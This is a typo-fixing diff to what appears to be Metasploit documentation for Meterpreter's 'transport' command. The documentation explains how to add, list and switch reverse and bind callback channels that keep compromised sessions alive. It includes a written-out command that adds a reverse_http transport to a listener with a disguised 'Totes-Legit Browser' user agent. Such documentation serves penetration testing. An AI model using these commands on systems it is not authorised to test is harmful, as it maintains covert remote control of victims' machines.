@@ -29,7 +29,7 @@ Usage: transport <list|change|add|next|prev> [options]
 OPTIONS:
 
     -c  <opt>  SSL certificate path for https transport verification (optional)
-    -ex <opt>  Expiration timout (seconds) (default: same as current session)
+    -ex <opt>  Expiration timeout (seconds) (default: same as current session)
     -h         Help menu
     -l  <opt>  LHOST parameter (for reverse transports)
     -p  <opt>  LPORT parameter
@@ -82,9 +82,9 @@ Session Expiry  : @ 2015-06-09 19:56:05
 
 ### Adding transports
 
-Adding transports is the hot new thing. It gives Meterpeter the ability to work on different transport mechanisms with the goal of keeping the sessions alive for longer. The command for adding new transports varies slightly depending on the transport that is being added.
+Adding transports is the hot new thing. It gives Meterpreter the ability to work on different transport mechanisms with the goal of keeping the sessions alive for longer. The command for adding new transports varies slightly depending on the transport that is being added.
 
-The following command shows a simple example that adds a `reverse_http` transport to an existing Meterpreter session. It specifies a custom communcations timeout, retry total and retry wait, and also specifies a custom user-agent string to be used for the HTTP requests:
+The following command shows a simple example that adds a `reverse_http` transport to an existing Meterpreter session. It specifies a custom communications timeout, retry total and retry wait, and also specifies a custom user-agent string to be used for the HTTP requests:
 
 ```
 meterpreter > transport add -t reverse_http -l 10.1.10.40 -p 5105 -rt 50000 -rw 2500 -to 100000 -ua "Totes-Legit Browser/1.1"
@@ -94,11 +94,11 @@ meterpreter > transport add -t reverse_http -l 10.1.10.40 -p 5105 -rt 50000 -rw 
 
 This command is what was used to create the transport that was listed in the sample verbose output for the `transport list` command. Here's a deeper explanation of the parameters:
 
-* The `-t` option is what tells Metasploit what type of transport to add. The options are `bind_tcp`, `reverse_tcp`, `reverse_http` and `reverse_https`. These match those that are used for the construction of the origina payloads. Given that we are not dealing with stages, there is no `reverse_winhttps` because Meterpreter always uses the WinHTTP API behind the scenes anyway.
+* The `-t` option is what tells Metasploit what type of transport to add. The options are `bind_tcp`, `reverse_tcp`, `reverse_http` and `reverse_https`. These match those that are used for the construction of the original payloads. Given that we are not dealing with stages, there is no `reverse_winhttps` because Meterpreter always uses the WinHTTP API behind the scenes anyway.
 * The `-l` option specifies what we all know as the `LHOST` parameter.
 * The `-p` option specifies what we all know as the `LPORT` parameter.
 * The `-rt` option matches the `retry total` parameter and is related to **connection resiliency** (link coming soon). The measure of this value is in seconds, and should be a positive integer that is more than `-rw`.
-* The `-rw` option matches the `retry wait` parameter and is related to **connection resiliency** (link coming soon). The measure of this value is in seconds, and should be a positive integer thta is less than `-rt`.
+* The `-rw` option matches the `retry wait` parameter and is related to **connection resiliency** (link coming soon). The measure of this value is in seconds, and should be a positive integer that is less than `-rt`.
 * The `-to` option matches the `communication timeout` parameter and is related to **connection resiliency** (link coming soon). The measure of this value is in seconds, and should be a positive integer.
 * The `-ua` specifies a custom user agent that is used for HTTP requests.
 
@@ -138,7 +138,7 @@ The three different ways to change transports are:
 
 * `transport next` - This command will cause Meterpreter to shut down the current transport, and attempt to reconnect to Metasploit using the next transport in the list of transports.
 * `transport prev` - This command is the same as `transport next`, except that it will move to the _previous_ transport in the list, and not the next one.
-* `transport change ...` - This command is functionally equivalent to running `transport add`, and hence requires all the paramters that `transport add` requires (resulting in a new transport at the end of the list), and then `transport prev` (which is the same as going from the start of the list to the end). The net effect is the same as creating a new transport and immediately switching to it.
+* `transport change ...` - This command is functionally equivalent to running `transport add`, and hence requires all the parameters that `transport add` requires (resulting in a new transport at the end of the list), and then `transport prev` (which is the same as going from the start of the list to the end). The net effect is the same as creating a new transport and immediately switching to it.
 
 As an example, here is the current transport setup:
 ```
